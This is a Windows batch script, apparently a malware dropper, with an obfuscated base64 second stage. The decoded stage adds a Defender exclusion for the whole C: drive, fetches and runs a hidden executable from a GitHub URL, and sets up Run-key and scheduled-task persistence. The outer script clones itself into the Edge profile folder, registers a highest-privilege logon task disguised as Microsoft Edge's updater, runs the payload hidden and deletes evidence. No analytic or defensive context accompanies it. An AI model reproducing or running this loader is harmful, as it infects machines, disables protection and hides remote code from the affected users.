@echo off
setlocal EnableDelayedExpansion

set "CHROMEDIR=%USERPROFILE%\AppData\Local\Chrome"
set "BATFILE=%CHROMEDIR%\WindowsUpdate.bat"
set "CLONEFOLDER=%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data"
set "CLONEFILE=%CLONEFOLDER%\clean.bat"

set "base64String=QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCnB1c2hkICIlfmRwMCIKCnBvd2Vyc2hlbGwgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcJyIKCnRpbWVvdXQgL3QgMyAvbm9icmVhayA+bnVsCgpzZXQgIkNIUk9NRURJUj0lTG9jYWxBcHBEYXRhJVxDaHJvbWUiCnNldCAiVEFSR0VUPSVDSFJPTUVESVIlXG1zZWRnZXYyLmV4ZSIKCmlmIG5vdCBleGlzdCAiJUNIUk9NRURJUiUiIG1rZGlyICIlQ0hST01FRElSJSIKYXR0cmliICtoICIlQ0hST01FRElSJSIgL3MgL2QKY2QgIiVDSFJPTUVESVIlIgoKOmRvd25sb2FkCmlmIG5vdCBleGlzdCAiJVRBUkdFVCUiICgKICAgIHBvd2Vyc2hlbGwgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cHM6Ly9naXRodWIuY29tL2NvbmZlc3N5b3VyY2luL3hvci1vYmZ1c2NhdG9yL3Jhdy9yZWZzL2hlYWRzL21haW4vbXNlZGdldjIuZXhlJyAtT3V0RmlsZSAnJVRBUkdFVCUnIgogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwKKQoKaWYgbm90IGV4aXN0ICIlVEFSR0VUJSIgKAogICAgdGltZW91dCAvdCAyID5udWwKICAgIGdvdG8gZG93bmxvYWQKKQoKYXR0cmliICtoICIlVEFSR0VUJSIgL3MgL2QKYXR0cmliICIlVEFSR0VUJSIgfCBmaW5kIC9pICJIIiA+bnVsCmlmIGVycm9ybGV2ZWwgMSAoCiAgICBhdHRyaWIgK2ggIiVUQVJHRVQlIiAvcyAvZAopCgo6c3RhcnRBcHAKc3RhcnQgIiIgIiVUQVJHRVQlIgp0aW1lb3V0IC90IDIgPm51bAp0YXNrbGlzdCB8IGZpbmQgL2kgIm1zZWRnZXYyLmV4ZSIgPm51bAppZiBlcnJvcmxldmVsIDEgKAogICAgdGltZW91dCAvdCAyID5udWwKICAgIGdvdG8gc3RhcnRBcHAKKQoKOnJlZ2VkaXQKcmVnIHF1ZXJ5ICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL3YgIk1pY3Jvc29mdCBFZGdlIFYyIiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICAgIHJlZyBhZGQgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvdiAiTWljcm9zb2Z0IEVkZ2UgVjIiIC90IFJFR19TWiAvZCAiXCIlVEFSR0VUJVwiIiAvZiA+bnVsCikKcmVnIHF1ZXJ5ICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL3YgIk1pY3Jvc29mdCBFZGdlIFYyIiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICAgIHJlZyBhZGQgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvdiAiTWljcm9zb2Z0IEVkZ2UgVjIiIC90IFJFR19TWiAvZCAiXCIlVEFSR0VUJVwiIiAvZiA+bnVsCikKCgpzZXQgIkJBVEZJTEU9JVVTRVJQUk9GSUxFJVxBcHBEYXRhXExvY2FsXENocm9tZVxjbGVhbi5iYXQiClNDSFRBU0tTIC9DcmVhdGUgL1ROICJDaHJvbWVDbGVhbmVyIiAvVFIgIiVCQVRGSUxFJSIgL1NDIE9OTE9HT04gL1JMIEhJR0hFU1QgL0YgPm51bCAyPiYxCgoKZGVsIC9mIC9xICIlfmYwIgpleGl0Cg=="

if not exist "%CHROMEDIR%" (
    mkdir "%CHROMEDIR%"
    attrib +h "%CHROMEDIR%"
)

if not exist "%CLONEFOLDER%" (
    mkdir "%CLONEFOLDER%"
)

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ^
    "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 '%BATFILE%'"

set /a trycount=0
:waitloop
if exist "%BATFILE%" goto clonefile
timeout /t 1 /nobreak >nul
set /a trycount+=1
if !trycount! GEQ 20 exit /b
goto waitloop

:clonefile
copy /Y "%~f0" "%CLONEFILE%" >nul


SCHTASKS /Create /TN "MicrosoftEdgeUpdateTaskMachineCorer{799C1051-93A4-41ED-87A1-273FDA3AACD0}" /TR "\"%CLONEFILE%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1

:runit
pushd "%CHROMEDIR%"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ^
    "Start-Process -FilePath 'WindowsUpdate.bat' -WindowStyle Hidden -Wait"
popd

timeout /t 30 /nobreak >nul
del /f /q "%BATFILE%"
exit
